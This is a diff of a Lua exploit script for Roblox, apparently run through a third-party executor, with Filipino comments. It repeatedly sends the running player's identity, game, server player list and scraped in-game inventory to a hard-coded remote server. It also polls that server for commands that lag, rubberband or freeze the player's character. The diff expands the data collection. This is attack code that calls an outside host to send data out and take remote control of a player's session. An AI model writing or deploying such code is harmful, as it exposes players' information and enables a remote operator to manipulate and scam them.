@@ -1,24 +1,23 @@
--- ===== CONFIGURATION =====
-local BASE = "https://crasherto-production.up.railway.app"  -- Palitan ng iyong URL
-local KEY = "CRASHER"
-
--- ===== REQUEST FUNCTION =====
-local function getRequest()
-    return http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or getgenv().http_request or getgenv().request or (getgenv().syn and getgenv().syn.request)
-end
-
-local request = getRequest()
-if not request then
-    local deadline = tick() + 10
-    repeat task.wait(0.25) request = getRequest() until request or tick() > deadline
-end
-if not request then return end
+local BASE = "https://crasherto-production.up.railway.app"  -- Palitan ng URL mo
+local KEY  = "CRASHER"
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local RunService = game:GetService("RunService")
-local Workspace = game:GetService("Workspace")
 local MarketplaceService = game:GetService("MarketplaceService")
+local Workspace = game:GetService("Workspace")
+
+local genv = (getgenv and getgenv()) or _G or {}
+local function resolveRequest()
+    return http_request or request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or genv.http_request or genv.request or (genv.syn and genv.syn.request)
+end
+
+local request = resolveRequest()
+if not request then
+    local deadline = tick() + 10
+    repeat task.wait(0.25) request = resolveRequest() until request or tick() > deadline
+end
+if not request then return end
 
 local LP = Players.LocalPlayer
 if not LP then
@@ -27,40 +26,234 @@ if not LP then
 end
 if not LP then return end
 
--- ===== UTILITY =====
-local function safe(fn)
-    local ok, res = pcall(fn)
-    return ok and res or nil
+local function safe(fn) local ok, res = pcall(fn) if ok then return res end return nil end
+
+local executorName = (identifyexecutor and select(1, identifyexecutor())) or "unknown"
+
+local function gameName()
+    local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
+    return info and info.Name or "Unknown Game"
 end
 
+local function avatarUrl()
+    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
+end
+
+local function serverPlayers()
+    local t = {}
+    for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
+    return t
+end
+
+local function collectBrainrots()
+    local list = {}
+    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
+    if not pg then return list end
+    
+    local possibleGUIs = {
+        "DuelsMachineSession",
+        "DuelsMachine",
+        "BrainrotUI",
+        "BrainrotSession",
+        "SessionGUI",
+        "DuelsGUI"
+    }
+    
+    local gui = nil
+    for _, name in ipairs(possibleGUIs) do
+        gui = safe(function() return pg:FindFirstChild(name) end)
+        if gui then break end
+    end
+    if not gui then return list end
+    
+    local targetFrame = nil
+    local function findFrame(container)
+        if not container then return end
+        for _, child in ipairs(container:GetChildren()) do
+            if child:IsA("Frame") and (child.Name == "ScrollingFrame" or child.Name == "ListFrame" or child.Name == "ItemList" or child:FindFirstChild("Template")) then
+                return child
+            end
+            local found = findFrame(child)
+            if found then return found end
+        end
+        return nil
+    end
+    
+    targetFrame = findFrame(gui)
+    if not targetFrame then 
+        targetFrame = safe(function() return gui:FindFirstChild("ScrollingFrame") end)
+    end
+    if not targetFrame then 
+        for _, child in ipairs(gui:GetDescendants()) do
+            if child:IsA("Frame") and #child:GetChildren() > 3 then
+                targetFrame = child
+                break
+            end
+        end
+    end
+    if not targetFrame then return list end
+    
+    local processedItems = {}
+    local function processItem(item)
+        if not item or not item:IsA("Instance") or processedItems[item] then return end
+        processedItems[item] = true
+        
+        local title = nil
+        local cash = nil
+        
+        for _, obj in ipairs(item:GetDescendants()) do
+            if (obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox")) and obj.Text and obj.Text ~= "" then
+                local text = obj.Text
+                if not string.find(text, "Template") and not string.find(text, "Background") and not string.find(text, "Frame") and not string.find(text, "Scroll") and not string.find(text, "Title") and not string.find(text, "Label") then
+                    if string.match(text, "%a") and #text > 1 and #text < 50 and not string.find(text, "^%d+$") then
+                        if not title or (#text > #title) then
+                            title = text
+                        end
+                    end
+                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") or string.find(text, "Cash") or 
+                       (string.match(text, "^%d+$") and tonumber(text) and tonumber(text) > 50) then
+                        cash = text
+                    end
+                end
+            end
+        end
+        
+        if title or cash then
+            if title and title ~= "" then
+                title = title:gsub("^[%s]+", ""):gsub("[%s]+$", "")
+            end
+            if cash and cash ~= "" then
+                cash = cash:gsub("^[%s]+", ""):gsub("[%s]+$", "")
+            end
+            if title and string.match(title, "^%d+$") and not cash then
+                return
+            end
+            table.insert(list, { 
+                title = title and title ~= "" and title or "Unknown Item", 
+                cash = cash and cash ~= "" and cash or "0" 
+            })
+        end
+    end
+    
+    local function processAll(container)
+        if not container then return end
+        for _, child in ipairs(container:GetChildren()) do
+            if child:IsA("Frame") and #child:GetChildren() > 0 then
+                local hasText = false
+                for _, desc in ipairs(child:GetDescendants()) do
+                    if (desc:IsA("TextLabel") or desc:IsA("TextButton") or desc:IsA("TextBox")) and desc.Text and desc.Text ~= "" then
+                        hasText = true
+                        break
+                    end
+                end
+                if hasText then
+                    processItem(child)
+                end
+            end
+            if child:IsA("Frame") or child:IsA("ScrollingFrame") then
+                processAll(child)
+            end
+        end
+    end
+    
+    processAll(targetFrame)
+    
+    for _, child in ipairs(targetFrame:GetChildren()) do
+        if child.Name == "Template" and child:IsA("Frame") then
+            processItem(child)
+        end
+    end
+    
+    if #list == 0 then
+        local simpleBrainrots = {}
+        local seenTexts = {}
+        for _, child in ipairs(pg:GetDescendants()) do
+            if (child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox")) and child.Text and child.Text ~= "" then
+                local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
+                if #text > 2 and #text < 30 and not string.match(text, "^%d+$") and not seenTexts[text] then
+                    seenTexts[text] = true
+                    local cash = "0"
+                    if string.find(text, "%$") or string.find(text, "Cookie") or string.find(text, "Milki") or string.find(text, "coins") then
+                        cash = text:match("[%$]*(%d+)") or text:match("(%d+)") or "0"
+                        text = text:gsub("[%$%d]+", ""):gsub("^[%s]+", ""):gsub("[%s]+$", "")
+                        if text == "" then text = "Item" end
+                    end
+                    if #text > 1 then
+                        table.insert(simpleBrainrots, { title = text, cash = cash })
+                    end
+                end
+            end
+        end
+        if #simpleBrainrots > 0 then
+            return simpleBrainrots
+        end
+    end
+    
+    return list
+end
+
+-- ===== HEARTBEAT =====
 local function heartbeat()
     safe(function()
-        local body = {
-            user_id = LP.UserId,
-            username = LP.Name,
-            display_name = LP.DisplayName,
-            place_id = game.PlaceId,
-            job_id = game.JobId,
-            executor = (identifyexecutor and select(1, identifyexecutor())) or "unknown",
-            server_players = (function()
-                local t = {}
-                for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
-                return t
-            end)(),
-            brainrots = {} -- ignore
-        }
-        pcall(function()
-            request({
+        local brainrots = collectBrainrots()
+        local success, result = pcall(function()
+            return request({
                 Url = BASE .. "/api/public/heartbeat",
                 Method = "POST",
                 Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
-                Body = HttpService:JSONEncode(body)
+                Body = HttpService:JSONEncode({
+                    user_id = LP.UserId,
+                    username = LP.Name,
+                    display_name = LP.DisplayName,
+                    avatar_url = avatarUrl(),
+                    place_id = game.PlaceId,
+                    game_name = gameName(),
+                    job_id = game.JobId,
+                    executor = executorName,
+                    server_players = serverPlayers(),
+                    brainrots = brainrots,
+                }),
             })
         end)
+        if not success then
+            local simpleBrainrots = {}
+            local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
+            if pg then
+                for _, child in ipairs(pg:GetDescendants()) do
+                    if (child:IsA("TextLabel") or child:IsA("TextButton")) and child.Text and child.Text ~= "" then
+                        local text = child.Text:gsub("^[%s]+", ""):gsub("[%s]+$", "")
+                        if #text > 2 and #text < 30 and not string.match(text, "^%d+$") then
+                            table.insert(simpleBrainrots, { title = text, cash = "0" })
+                        end
+                    end
+                end
+            end
+            if #simpleBrainrots > 0 then
+                pcall(function()
+                    request({
+                        Url = BASE .. "/api/public/heartbeat",
+                        Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
+                        Body = HttpService:JSONEncode({
+                            user_id = LP.UserId,
+                            username = LP.Name,
+                            display_name = LP.DisplayName,
+                            avatar_url = avatarUrl(),
+                            place_id = game.PlaceId,
+                            game_name = gameName(),
+                            job_id = game.JobId,
+                            executor = executorName,
+                            server_players = serverPlayers(),
+                            brainrots = simpleBrainrots,
+                        }),
+                    })
+                end)
+            end
+        end
     end)
 end
 
--- ===== LAG VARIABLES =====
+-- ===== LAG FUNCTIONS =====
 local fpsConn = nil
 local fpsOn = false
 local function setFpsLimit(on)
@@ -92,7 +285,9 @@ RunService.Heartbeat:Connect(function()
     local now = tick()
     posHistory[#posHistory+1] = { cframe = root.CFrame, time = now }
     local cutoff = now - HISTORY_SIZE - 0.1
-    while #posHistory > 0 and posHistory[1].time < cutoff do table.remove(posHistory, 1) end
+    while #posHistory > 0 and posHistory[1].time < cutoff do
+        table.remove(posHistory, 1)
+    end
 end)
 
 local function currentSpeed()
@@ -115,7 +310,8 @@ local function doRubberband()
     local root = char and char:FindFirstChild("HumanoidRootPart")
     if not root then return end
     local vel = root.AssemblyLinearVelocity
-    if Vector3.new(vel.X, 0, vel.Z).Magnitude < 1 then return end
+    local horizVel = Vector3.new(vel.X, 0, vel.Z)
+    if horizVel.Magnitude < 1 then return end
     local targetTime = tick() - HISTORY_SIZE
     local best = nil
     for i = 1, #posHistory do
@@ -130,7 +326,10 @@ local function doRubberband()
 end
 
 local function stopLoop()
-    if intervalThread then pcall(task.cancel, intervalThread) intervalThread = nil end
+    if intervalThread then
+        pcall(task.cancel, intervalThread)
+        intervalThread = nil
+    end
 end
 
 local function startLoop()
@@ -153,61 +352,86 @@ end
 local function setMode(newMode)
     if mode == newMode then return end
     mode = newMode
-    if mode then isActive = true startLoop() else isActive = false stopLoop() end
+    if mode then
+        isActive = true
+        startLoop()
+    else
+        isActive = false
+        stopLoop()
+    end
 end
 
--- ===== DESTROY =====
+-- ===== DESTROY (Sobrang lag) =====
 local isDestroyActive = false
 local destroyThread = nil
 
--- ===== LAG BACK =====
+-- ===== LAG BACK (Constant pullback) =====
 local isLagBackActive = false
 local lagBackThread = nil
 local lastPos = nil
 
 -- ===== RESET CHARACTER =====
 local function resetCharacter()
-    -- Stop all
+    -- Stop all lag effects
     setMode(nil)
     setFpsLimit(false)
+    
     isDestroyActive = false
     if destroyThread then pcall(task.cancel, destroyThread) destroyThread = nil end
+    
     isLagBackActive = false
     if lagBackThread then pcall(task.cancel, lagBackThread) lagBackThread = nil end
     lastPos = nil
-
+    
     local char = LP.Character
     if char then
         local root = char:FindFirstChild("HumanoidRootPart")
         local hum = char:FindFirstChild("Humanoid")
+        
         if root then
-            local spawn = nil
+            -- Find spawn
+            local spawnLocation = nil
             local spawns = Workspace:FindFirstChild("Spawns")
-            if spawns and #spawns:GetChildren() > 0 then spawn = spawns:GetChildren()[1] end
-            if not spawn then
+            if spawns and #spawns:GetChildren() > 0 then
+                spawnLocation = spawns:GetChildren()[1]
+            end
+            if not spawnLocation then
                 for _, obj in ipairs(Workspace:GetDescendants()) do
-                    if obj:IsA("SpawnLocation") then spawn = obj break end
+                    if obj:IsA("SpawnLocation") then
+                        spawnLocation = obj
+                        break
+                    end
                 end
             end
-            if spawn then root.CFrame = spawn.CFrame * CFrame.new(0, 3, 0)
-            else root.Position = Vector3.new(0, 10, 0) end
-            root.AssemblyLinearVelocity = Vector3.new(0,0,0)
-            root.AssemblyAngularVelocity = Vector3.new(0,0,0)
+            if spawnLocation then
+                root.CFrame = spawnLocation.CFrame * CFrame.new(0, 3, 0)
+            else
+                root.Position = Vector3.new(0, 10, 0)
+            end
+            root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+            root.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
         end
+        
         if hum then
             hum.Health = hum.MaxHealth
             hum.PlatformStand = false
+            for _, part in ipairs(char:GetDescendants()) do
+                if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+                    part.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+                    part.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
+                end
+            end
         end
     end
 end
 
--- ===== POLL =====
+-- ===== POLL COMMANDS =====
 local kicked = false
 local prevLagN = false
 local prevLagC = false
-local prevLagBack = false
-local prevDestroy = false
 local prevFps = false
+local prevDestroy = false
+local prevLagBack = false
 local prevReset = false
 local lastReset = 0
 
@@ -220,11 +444,10 @@ local function poll()
         })
     end)
     if not res or not res.Body then return end
+    local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
+    if not ok2 or type(data) ~= "table" then return end
 
-    local ok, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
-    if not ok or type(data) ~= "table" then return end
-
-    -- FPS
+    -- FPS LIMIT
     local wantFps = (data.fps_limit == true)
     if wantFps ~= prevFps then
         prevFps = wantFps
@@ -236,7 +459,10 @@ local function poll()
         lastReset = tick()
         resetCharacter()
         -- Reset all states
-        prevLagN = false; prevLagC = false; prevLagBack = false; prevDestroy = false
+        prevLagN = false
+        prevLagC = false
+        prevDestroy = false
+        prevLagBack = false
         return
     end
 
@@ -244,17 +470,29 @@ local function poll()
     local wantN = (data.lag_n == true)
     if wantN ~= prevLagN then
         prevLagN = wantN
-        if wantN then setMode("normal") else if not prevLagC and not prevLagBack then setMode(nil) end end
+        if wantN then
+            setMode("normal")
+        else
+            if not prevLagC and not prevLagBack then
+                setMode(nil)
+            end
+        end
     end
 
     -- LAG C
     local wantC = (data.lag_c == true)
     if wantC ~= prevLagC then
         prevLagC = wantC
-        if wantC then setMode("carry") else if not prevLagN and not prevLagBack then setMode(nil) end end
+        if wantC then
+            setMode("carry")
+        else
+            if not prevLagN and not prevLagBack then
+                setMode(nil)
+            end
+        end
     end
 
-    -- LAG BACK
+    -- LAG BACK (Constant pullback)
     local wantBack = (data.lag_back == true)
     if wantBack ~= prevLagBack then
         prevLagBack = wantBack
@@ -271,7 +509,7 @@ local function poll()
                         if not lastPos then lastPos = root.Position end
                         if (root.Position - lastPos).Magnitude > 1 then
                             root.Position = lastPos
-                            root.AssemblyLinearVelocity = Vector3.new(0,0,0)
+                            root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                         else
                             lastPos = root.Position
                         end
@@ -300,7 +538,7 @@ local function poll()
                         local vel = root.AssemblyLinearVelocity
                         if vel.Magnitude > 0.5 then
                             root.Position = root.Position - (vel * 0.15)
-                            root.AssemblyLinearVelocity = Vector3.new(0,0,0)
+                            root.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                         end
                     end
                     task.wait(0.02)
@@ -323,8 +561,14 @@ local function poll()
     end
 end
 
--- ===== START =====
+-- ===== START LOOPS =====
 heartbeat()
 poll()
-task.spawn(function() while task.wait(3) do heartbeat() end end)
-task.spawn(function() while task.wait(0.5) do poll() end end)
+
+task.spawn(function()
+    while task.wait(3) do heartbeat() end
+end)
+
+task.spawn(function()
+    while task.wait(0.5) do poll() end
+end)
